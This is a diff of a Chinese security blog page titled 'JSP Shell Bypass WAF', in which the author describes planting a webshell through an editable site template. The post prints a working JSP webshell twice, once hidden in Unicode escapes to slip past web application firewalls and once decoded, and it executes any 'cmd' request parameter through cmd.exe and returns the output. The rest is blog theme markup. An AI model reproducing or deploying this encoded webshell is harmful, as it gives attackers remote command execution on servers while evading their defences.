@@ -1,256 +1,195 @@
-
-
 <!DOCTYPE html>
-<html lang="">
-<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="">
-    <title>JSP Shell Bypass WAF | c1y2m3’blog</title>
+    <meta name="keyword" content="">
+    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
 
-    <!-- Open Graph -->
-    <meta name="description" content="&amp;#x4E3B;&amp;#x8981;&amp;#x63D0;&amp;#x4F9B;&amp;#x4E00;&amp;#x79CD;&amp;#x601D;&amp;#x8DEF;&amp;#xFF0C;&amp;#x6212;&amp;#x9A84;&amp;#x6212;&amp;#x8E81; &amp;#x4E4B;&amp;#x524D;&amp;#x5728;&amp;#x4E00;&amp;#x6B21;&amp;#x9879;&amp;#x76EE;&amp;#x4E2D;&amp;#xFF0C;&amp;#x53D1;&amp;#x73B0;&amp;#x540E">
-<meta property="og:type" content="article">
-<meta property="og:title" content="JSP Shell Bypass WAF">
-<meta property="og:url" content="http://yoursite.com/2019/04/04/15543609538285/index.html">
-<meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="&amp;#x4E3B;&amp;#x8981;&amp;#x63D0;&amp;#x4F9B;&amp;#x4E00;&amp;#x79CD;&amp;#x601D;&amp;#x8DEF;&amp;#xFF0C;&amp;#x6212;&amp;#x9A84;&amp;#x6212;&amp;#x8E81; &amp;#x4E4B;&amp;#x524D;&amp;#x5728;&amp;#x4E00;&amp;#x6B21;&amp;#x9879;&amp;#x76EE;&amp;#x4E2D;&amp;#xFF0C;&amp;#x53D1;&amp;#x73B0;&amp;#x540E">
-<meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-04T07:06:10.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JSP Shell Bypass WAF">
-<meta name="twitter:description" content="&amp;#x4E3B;&amp;#x8981;&amp;#x63D0;&amp;#x4F9B;&amp;#x4E00;&amp;#x79CD;&amp;#x601D;&amp;#x8DEF;&amp;#xFF0C;&amp;#x6212;&amp;#x9A84;&amp;#x6212;&amp;#x8E81; &amp;#x4E4B;&amp;#x524D;&amp;#x5728;&amp;#x4E00;&amp;#x6B21;&amp;#x9879;&amp;#x76EE;&amp;#x4E2D;&amp;#xFF0C;&amp;#x53D1;&amp;#x73B0;&amp;#x540E">
-
-    <script type="application/ld+json">
-{
-  "@context": "http://schema.org",
-  "@type": "Person",
-  "email": "mailto:",
-  "image": "",
-  "name": "John Doe",
-  "url": "http://yoursite.com"
-}
-</script>
-    <script>
-    var algoliaEnabled = false;
-    
-</script>
-
-    
-
-    
-    
-        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-    
-    
-    
-        <!-- stylesheets list from config.yml -->
+    <title>
         
-        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
+        JSP Shell Bypass WAF - undefined
         
-        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
-        
-        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
-        
-    
+    </title>
 
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
 </head>
-<body id="body" style="margin-bottom: 0;" class="pushable">
 
-    <div class="ui top fixed menu">
-        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
-    </div>
+<body>
 
-    <div id="menu-sidebar" class="ui left vertical sidebar menu">
-
-    <div id="sidebar-top">
-        <div class="content">
-            <h3>c1y2m3’blog</h3>
-        </div>
-    </div>
-    <div class="ui container sidebar-card">
-    <div class="ui people shape content">
-        <div class="active side">
-            <div class="ui card">
-                <div class="image">
-                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
-                </div>
-                <div class="content">
-                    <a class="header">John Doe</a>
-                    
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                        
-                    </div>
-
-                </div>
-                <div class="extra content">
-                    <div class="ui list">
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
 </div>
 
-    
-    
-
-    
-
-    
-    <a href="/index.html" class="item">
-        <i class="home icon"></i>
-        HOME
-    </a>
-
-    
-
-    
+<div class="index-about">
+    <i>  </i>
 </div>
 
-    <div class="pusher body-content">
-        <div id="content" class="ui main container">
-            <!--<div class="ui one column grid">-->
-                <!--<div class="column">-->
-                    <!--<div class="ui main container">-->
-                        <div id="post-15543609538285" class="ui main container article-type-post">
-
+<div class="index-container">
     
-
-    <div class="ui divided grid">
-
-        <div class="two column row" id="article-content">
-
-            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
-                
-
-<h1 class="ui header">
-    
-    JSP Shell Bypass WAF
-</h1>
-
-
-
-                <div class="article-inner">
-
-                    <div class="article-entry" itemprop="articleBody">
-                        
-                        <p><code>&#x4E3B;&#x8981;&#x63D0;&#x4F9B;&#x4E00;&#x79CD;&#x601D;&#x8DEF;&#xFF0C;&#x6212;&#x9A84;&#x6212;&#x8E81;</code></p>
-<p>&#x4E4B;&#x524D;&#x5728;&#x4E00;&#x6B21;&#x9879;&#x76EE;&#x4E2D;&#xFF0C;&#x53D1;&#x73B0;&#x540E;&#x53F0;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x7F51;&#x7AD9;&#x6A21;&#x677F;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E00;&#x6CE2;&#x603C;&#xFF0C;&#x53D1;&#x73B0;&#x51E0;&#x4E4E;&#x4E0A;&#x4F20;&#x4E0D;&#x4E0A; </p>
-<p>&#x7531;&#x4E8E;JSP &#x7684;content-type &#x7C7B;&#x578B;&#x4E3A; text/html  </p>
-<p>&#x6545;&#x5229;&#x7528;&#x6B64;&#x7279;&#x6027; &#x4F7F;&#x7528;html&#x4E2D; Unicode 16&#x8FDB;&#x5236;&#x7F16;&#x7801; &#x6210;&#x529F;&#x4E0A;&#x4F20;&#xFF0C;&#x540E;&#x67E5;&#x770B;&#x8FDB;&#x7A0B; &#x53D1;&#x73B0;&#x5B58;&#x5728;360&#x7F51;&#x7AD9;&#x536B;&#x58EB;&#x3001;&#x817E;&#x8BAF;&#x7F51;&#x7AD9;&#x9632;&#x62A4;..</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0043\u006f\u006d\u006d\u0061\u006e\u0064\u003a\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u002b\u0020\u0022\u005c\u006e\u003c\u0042\u0052\u003e\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u0070\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u006f\u0073\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0064\u0069\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0069\u006e\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0028\u0020\u0064\u0069\u0073\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0064\u0069\u0073\u0072\u0029\u003b\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-<p>&#x89E3;&#x7801;&#x4E3A;&#xFF1A;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">if (request.getParameter(&quot;cmd&quot;) != null) {</span><br><span class="line">        out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">        Process p = Runtime.getRuntime().exec(&quot;cmd.exe /c &quot; + request.getParameter(&quot;cmd&quot;));</span><br><span class="line">        OutputStream os = p.getOutputStream();</span><br><span class="line">        InputStream in = p.getInputStream();</span><br><span class="line">        DataInputStream dis = new DataInputStream(in);</span><br><span class="line">        String disr = dis.readLine();</span><br><span class="line">        while ( disr != null ) {</span><br><span class="line">                out.println(disr); disr = dis.readLine(); }</span><br><span class="line">        }</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-                        
-                    </div>
-
-                    
-                    
-                    
-
-                    <div class="description post-description">
-    <span class="post-description-item">
-        <time datetime="2019-04-04T07:00:00.000Z" itemprop="datePublished">2019-04-04</time>
-
-    </span>
-    <span class="post-description-item">
+    <div class="index-left">
         
-    </span>
-</div>
-
-                </div>
-                
-                <div id="pagination" class="nav-web ui text container pagination">
-
-    <div class="ui stackable two column divided grid container">
-        <div class="row">
-            <div class="column nav-left">
-                
-
-                <a href="/c1y2m3.github.io/2019/05/26/26/" class="ui tiny button">
-
-                    <i class="angle left icon"></i>
-                    
-                    JBoss引起的内网渗透
-                    
-
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/c1y2m3.github.io/">
+        </div>
+        <div class="name">
+            <i>John Doe</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/c1y2m3.github.io/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
                 </a>
-
-                
-            </div>
-            <div class="column nav-right">
-                
-
-                <a href="/c1y2m3.github.io/2019/04/02/15542127307091/" class="ui tiny button">
-                    
-                    域渗透之Kerberoasting攻击
-                    
-                    <i class="angle right icon"></i></a>
-                
-            </div>
-        </div>
-    </div>
-
-</div>
-                
-            </div>
-
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
             
-            <div class="three wide computer three wide tablet column">
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    
+</div>
+    
+</div>
 
-                <div class="ui sticky article-toc" id="article-toc">
-                    <!-- toc -->
-                    
-                </div>
 
-            </div>
-            
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
 
         </div>
     </div>
 </div>
 
-
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
+        <div class="index-about-mobile">
+            <i>  </i>
         </div>
-        <div class="ui vertical footer segment">
-    <div class="ui center aligned container">
-        <div class="ui inverted section divider"></div>
-        &copy; 2019 <a href="/">John Doe</a>,
-        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        JSP Shell Bypass WAF
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-04-04 15:00:00</span></span>
+        
+        
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <p><code>主要提供一种思路，戒骄戒躁</code></p>
+<p>之前在一次项目中，发现后台可以编辑网站模板，经过一波怼，发现几乎上传不上 </p>
+<p>由于JSP 的content-type 类型为 text/html  </p>
+<p>故利用此特性 使用html中 Unicode 16进制编码 成功上传，后查看进程 发现存在360网站卫士、腾讯网站防护..</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0043\u006f\u006d\u006d\u0061\u006e\u0064\u003a\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u002b\u0020\u0022\u005c\u006e\u003c\u0042\u0052\u003e\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u0070\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u006f\u0073\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0064\u0069\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0069\u006e\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0028\u0020\u0064\u0069\u0073\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0064\u0069\u0073\u0072\u0029\u003b\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>解码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">        out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">        Process p = Runtime.getRuntime().exec(&quot;cmd.exe /c &quot; + request.getParameter(&quot;cmd&quot;));</span><br><span class="line">        OutputStream os = p.getOutputStream();</span><br><span class="line">        InputStream in = p.getInputStream();</span><br><span class="line">        DataInputStream dis = new DataInputStream(in);</span><br><span class="line">        String disr = dis.readLine();</span><br><span class="line">        while ( disr != null ) &#123;</span><br><span class="line">                out.println(disr); disr = dis.readLine(); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
     </div>
 </div>
 
     </div>
+</div>
 
 
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
 
+        
 
-<!-- scripts list from theme config.yml -->
+        
 
-<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
 
-<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>
-
-<script src="/c1y2m3.github.io/js/semantic-ui-algolia.js"></script>
-
-<script src="/c1y2m3.github.io/js/aloha-events.js"></script>
 
 
 
 </body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/c1y2m3.github.io/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
 </html>
